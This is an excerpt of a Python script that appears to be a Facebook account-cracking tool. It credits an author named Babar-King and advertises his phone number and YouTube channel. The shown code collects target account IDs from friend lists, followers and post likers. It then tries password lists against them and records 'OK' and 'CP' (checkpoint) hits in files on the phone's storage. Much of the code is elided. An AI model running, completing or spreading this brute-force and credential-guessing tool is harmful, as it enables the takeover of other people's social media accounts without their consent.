...
def banner():
	clear()
	wel='# JISKO APNE NAME KY COMMAND BANWANY HAIN RABTA KREN: 03352953611'
...
\_______/ \__|  \__|\_______/ \__|  \__|\__|  \__|
          ...
          Author  : Babar-King
          Number : 03099620755
          My YouTube Channel : https://www.youtube.com/channel/UCI6MHh8a0ljC_O1f77LuTAg
         version 2.0'''             
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# ASSALAM O ALAIKUM CHANNEL SUBSCRIBE LAZMI KRNA WRNA OK IDZ NI AYEGI SHURKIYA'
	fx = mark(sg, style=' bold blue')
	sol().print(fx)
	sg = '# 🖥️SCRIPT USER NAME🖥️ '
	fx = mark(sg, style=' bold green')
	sol().print(fx)
	print(x+'['+h+'✓'+x+'] NAME   BABAR : '+str(my_name))
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/BABAR-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/BABAR-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
		...
		try:vin = os.listdir('/sdcard/BABAR-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/BABAR-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'BABAR'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/BABAR-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/BABAR-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/BABAR-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/BABAR-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'BABAR'+x+'] ENTER LIMIT ID TOTAL [20]')
		try:
			jum = int(input(x+'['+p+'BABAR'+x+'] Number Of Id : '))
		except ValueError:
		...
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'BABAR'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
...
def dump_pengikut():
	...
	pil = input(x+'['+p+'BABAR'+x+'] INPUT TARGET ID : ')
	try:
		...
		print(x+'['+h+'BABAR'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
...
def dump_likes():
	...
	win2 = mark(win, style='bold green')
	sol().print(win2)
	pil = input(x+'['+p+'BABAR'+x+'] INPUT ID POST : ')
	try:
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%sBABAR %s🐍%s 🐍 OK:%s 🐍 CP:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='BABAR XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='BABAR LIVE'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]BABAR LIVE[/bold green]'))
					ok+=1
					break
